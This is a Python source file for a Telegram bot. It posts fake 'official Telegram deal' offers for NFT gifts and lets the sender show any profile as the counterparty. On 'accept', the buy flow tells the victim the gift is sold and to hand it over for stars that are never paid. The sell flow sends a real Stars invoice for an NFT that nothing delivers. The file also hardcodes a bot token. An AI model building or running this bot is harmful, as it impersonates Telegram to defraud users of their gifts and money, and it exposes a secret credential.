import asyncio
import logging
import re
import uuid
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LabeledPrice

# Вставь сюда токен своего бота от @BotFather
TOKEN = "8264809759:AAF9UobaS-ZbopNd_jYiR1TIxs8_O0wEyQU"

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Временное хранилище данных о сделках в памяти бота
deals_storage = {}

def parse_nft_title(nft_input: str) -> str:
    """Извлекает красивое название NFT из ссылки или текста."""
    clean_str = nft_input.strip()
    match = re.search(r'([^/]+)$', clean_str)
    if match:
        raw_name = match.group(1).replace('-', ' #').replace('_', ' ')
        return raw_name
    return clean_str

def get_user_mention(message: Message, target_profile: str = None) -> str:
    """Возвращает указанный профиль или ник отправителя."""
    if target_profile:
        target_profile = target_profile.strip()
        if not target_profile.startswith("@") and not target_profile.startswith("http"):
            target_profile = f"@{target_profile}"
        return target_profile
    
    if message.from_user.username:
        return f"@{message.from_user.username}"
    return message.from_user.first_name or "Пользователь"


# ----------------------------------------------------
# 1. Команда .buy <ссылка_nft> <сумма> [профиль]
# ----------------------------------------------------
@dp.message(F.text.startswith(".buy"))
async def handle_buy_cmd(message: Message):
    await asyncio.sleep(0.3)
    args = message.text.split(maxsplit=3)
    
    if len(args) < 3:
        await message.answer(
            "⚠️ **Формат:** `.buy <ссылка_на_nft> <сумма> [профиль]`\n\n"
            "Пример:\n"
            "• `.buy https://t.me/nft/BowTie-51908 600`\n"
            "• `.buy https://t.me/nft/BowTie-51908 600 @durov`",
            parse_mode="Markdown"
        )
        return

    nft_raw = args[1]
    stars = int(args[2])
    target_profile = args[3] if len(args) > 3 else None

    nft_title = parse_nft_title(nft_raw)
    profile_mention = get_user_mention(message, target_profile)

    deal_id = str(uuid.uuid4())[:8]
    deals_storage[deal_id] = {
        "stars": stars,
        "nft_title": nft_title,
        "profile": profile_mention,
        "nft_link": nft_raw
    }

    text = (
        f"**Telegram**\n"
        f"**{nft_title}**\n\n"
        f"ПОКАЗАТЬ ПОДАРОК\n\n"
        f"Пользователь **{profile_mention}** предлагает Вам **{stars} ⭐ звёзд** за подарок **{nft_title}**.\n\n"
        f"Ссылка на NFT: {nft_raw}\n"
        f"Предложение действует ещё 6ч.\n\n"
        f"_ℹ️ Официальная сделка Telegram_"
    )

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="❌ Decline", callback_data="decline_offer"),
                InlineKeyboardButton(text="✅ Accert", callback_data=f"buy_ok:{deal_id}")
            ]
        ]
    )

    if nft_raw.startswith("http") and any(nft_raw.lower().endswith(ext) for ext in ['.jpg', '.png', '.webp']):
        await message.answer_photo(photo=nft_raw, caption=text, reply_markup=keyboard, parse_mode="Markdown")
    else:
        await message.answer(text, reply_markup=keyboard, parse_mode="Markdown")


# ----------------------------------------------------
# 2. Команда .sell <ссылка_nft> <сумма> [профиль]
# ----------------------------------------------------
@dp.message(F.text.startswith(".sell"))
async def handle_sell_cmd(message: Message):
    await asyncio.sleep(0.3)
    args = message.text.split(maxsplit=3)
    
    if len(args) < 3:
        await message.answer(
            "⚠️ **Формат:** `.sell <ссылка_на_nft> <сумма> [профиль]`\n\n"
            "Пример:\n"
            "• `.sell https://t.me/nft/BowTie-51908 600`\n"
            "• `.sell https://t.me/nft/BowTie-51908 600 @durov`",
            parse_mode="Markdown"
        )
        return

    nft_raw = args[1]
    stars = int(args[2])
    target_profile = args[3] if len(args) > 3 else None

    nft_title = parse_nft_title(nft_raw)
    profile_mention = get_user_mention(message, target_profile)

    deal_id = str(uuid.uuid4())[:8]
    deals_storage[deal_id] = {
        "stars": stars,
        "nft_title": nft_title,
        "profile": profile_mention,
        "nft_link": nft_raw
    }

    text = (
        f"**Telegram**\n"
        f"**{nft_title}**\n\n"
        f"ПОКАЗАТЬ ПОДАРОК\n\n"
        f"Пользователь **{profile_mention}** предлагает вам продажу NFT **{nft_title}** за **{stars} ⭐ звёзд**.\n\n"
        f"Ссылка на NFT: {nft_raw}\n"
        f"Предложение действует ещё 6ч.\n\n"
        f"_ℹ️ Официальная сделка Telegram_"
    )

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="❌ Отклонить", callback_data="decline_offer"),
                InlineKeyboardButton(text="✅ Принять", callback_data=f"sell_ok:{deal_id}")
            ]
        ]
    )

    if nft_raw.startswith("http") and any(nft_raw.lower().endswith(ext) for ext in ['.jpg', '.png', '.webp']):
        await message.answer_photo(photo=nft_raw, caption=text, reply_markup=keyboard, parse_mode="Markdown")
    else:
        await message.answer(text, reply_markup=keyboard, parse_mode="Markdown")


# ----------------------------------------------------
# 3. Обработка кнопок
# ----------------------------------------------------
@dp.callback_query(F.data == "decline_offer")
async def process_decline(callback: CallbackQuery):
    await callback.answer("Предложение отклонено")
    if callback.message.photo:
        await callback.message.edit_caption(caption="❌ Предложение было отклонено.")
    else:
        await callback.message.edit_text("❌ Предложение было отклонено.")


@dp.callback_query(F.data.startswith("buy_ok:"))
async def process_accept_buy(callback: CallbackQuery):
    deal_id = callback.data.split(":", 1)[1]
    deal = deals_storage.get(deal_id)

    if not deal:
        await callback.answer("Срок действия предложения истек.", show_alert=True)
        return

    new_text = (
        f"**Telegram**\n"
        f"**{deal['nft_title']}**\n\n"
        f"ПОКАЗАТЬ ПОДАРОК\n\n"
        f"🎁 **Подарок: {deal['nft_title']} успешно продан!**\n\n"
        f"👤 **Получатель / Профиль:** {deal['profile']}\n"
        f"🔗 **Ссылка на NFT:** {deal['nft_link']}\n\n"
        f"**Передайте подарок покупателю для зачисления {deal['stars']} ⭐ звёзд.**"
    )

    new_keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Передать NFT ↗", url=deal['nft_link'])],
            [InlineKeyboardButton(text="Как передать?", callback_data="how_to_transfer")]
        ]
    )

    if callback.message.photo:
        await callback.message.edit_caption(caption=new_text, reply_markup=new_keyboard, parse_mode="Markdown")
    else:
        await callback.message.edit_text(new_text, reply_markup=new_keyboard, parse_mode="Markdown")
    await callback.answer()


@dp.callback_query(F.data.startswith("sell_ok:"))
async def process_accept_sell(callback: CallbackQuery):
    deal_id = callback.data.split(":", 1)[1]
    deal = deals_storage.get(deal_id)

    if not deal:
        await callback.answer("Срок действия предложения истек.", show_alert=True)
        return

    # Отправляем реальный счет на оплату Звездами (XTR)
    prices = [LabeledPrice(label=f"NFT {deal['nft_title']}", amount=deal['stars'])]
    
    await callback.message.answer_invoice(
        title=f"Покупка {deal['nft_title']}",
        description=f"Оплата звёздами за NFT у пользователя {deal['profile']}",
        payload=f"nft_pay_{deal_id}",
        currency="XTR",
        prices=prices
    )
    await callback.answer("Счет на оплату отправлен в чат!")


@dp.callback_query(F.data == "how_to_transfer")
async def process_how_to(callback: CallbackQuery):
    await callback.answer("Для передачи откройте профиль подарка в Telegram и нажмите 'Отправить'.", show_alert=True)


async def main():
    logging.basicConfig(level=logging.INFO)
    print("Бот успешно запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
